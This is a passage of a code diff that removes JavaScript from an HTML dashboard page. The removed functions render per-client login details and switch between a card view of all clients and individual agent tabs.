-      table.appendChild(createRow("LastLogin", info.LastLogin));
-      table.appendChild(createRow("LogedInSessions", info.LogedInSessions));
-
-      panelEl.appendChild(table);
-    }
-
-    /**
-     * Show All Clients => revert to original card view
-     */
-    function showAllClients() {
-      // Deactivate all tabs
-      Object.values(clientTabsMap).forEach(({ tabEl }) => tabEl.classList.remove("active"));
-      // Hide all detail panels
-      Object.values(clientTabsMap).forEach(({ panelEl }) => panelEl.classList.remove("active"));
-      domRefs.allClientsTab.classList.add("active");
-
-      // Show all client cards
-      domRefs.clientsContainer.querySelectorAll(".client-card").forEach(card => {
-        card.style.display = "flex";
-        card.style.border = "";
-      });
-    }
-
-    /**
-     * Open a specific client tab => hide cards, show detail
-     */
-    function openTab(agentId) {
-      // Hide all cards
-      domRefs.clientsContainer.querySelectorAll(".client-card").forEach(card => {
-        card.style.display = "none";
-      });
-
-      // Deactivate other tabs
-      domRefs.tabsContainer.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active"));
-      // Deactivate other panels
-      domRefs.tabContent.querySelectorAll(".active-client-tab").forEach(panel => {
-        panel.classList.remove("active");
-      });
-
-      // Activate the selected tab
-      const tabInfo = clientTabsMap[agentId];
-      if (tabInfo) {
-        tabInfo.tabEl.classList.add("active");
-        tabInfo.panelEl.classList.add("active");
-      }
-    }
-
-    /**
-     * Close the tab
-     */
-    function closeTab(agentId) {
-      // Remove the tab from DOM
-      const tabInfo = clientTabsMap[agentId];
-      if (tabInfo) {
-        domRefs.tabsContainer.removeChild(tabInfo.tabEl);
-        domRefs.tabContent.removeChild(tabInfo.panelEl);
-        delete clientTabsMap[agentId];
-      }
-
-      // Reset the border of the corresponding card
-      const card = domRefs.clientsContainer.querySelector('[data-agent-id="' + agentId + '"]');
-      if (card) {
-        card.style.border = "";
-      }
-
-      // Show All Clients
-      showAllClients();
-    }
-  </script>
+  }
+}
+</script>
 </body>
 </html>
